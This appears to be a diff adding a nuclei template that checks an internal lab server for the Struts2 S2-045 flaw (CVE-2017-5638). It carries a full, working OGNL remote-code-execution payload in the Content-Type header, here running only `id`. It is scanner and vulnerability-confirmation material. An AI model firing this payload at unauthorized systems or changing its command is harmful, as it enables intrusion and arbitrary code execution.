@@ -1,0 +1,47 @@
+id: s2-045-lab
+
+# Internal-lab active check for CVE-2017-5638 (Struts2 S2-045), calibrated to the
+# vulhub struts2/s2-045 showcase image used on vmWeb (172.18.0.102:8080).
+#
+# The stock nuclei template (http/cves/2017/CVE-2017-5638.yaml) does NOT fire on this
+# target, for two independent reasons we confirmed by hand:
+#   1. it sends GET /, but the Jakarta Multipart parser -- the sink for S2-045 -- is
+#      only invoked on a POST, so the OGNL in the Content-Type is never evaluated;
+#   2. its OGNL payload is the 2.5.x DEFAULT_MEMBER_ACCESS variant; this showcase is
+#      Struts 2.3.x, which needs the classic _memberAccess-clearing payload.
+# This template fixes both: a POST whose Content-Type carries the 2.3.x payload and
+# contains the literal "multipart/form-data" that makes Struts attempt multipart
+# parsing. The command run is a read-only `id`; the match is its root uid.
+#
+# Authorized internal-lab use only.
+
+info:
+  name: Apache Struts2 S2-045 RCE (lab-calibrated, POST)
+  author: threatrank
+  severity: critical
+  description: |
+    Active confirmation of CVE-2017-5638 on the vulhub s2-045 showcase: a POST with a
+    crafted Content-Type triggers OGNL evaluation in the Jakarta Multipart parser and
+    executes `id`, whose output is reflected in the response body.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2017-5638
+    - https://github.com/vulhub/vulhub/tree/master/struts2/s2-045
+  classification:
+    cve-id: CVE-2017-5638
+  tags: cve,cve2017,struts,rce,kev,lab
+
+http:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "uid=[0-9]+\\(.*\\) gid=[0-9]+"
+      - type: status
+        status:
+          - 200
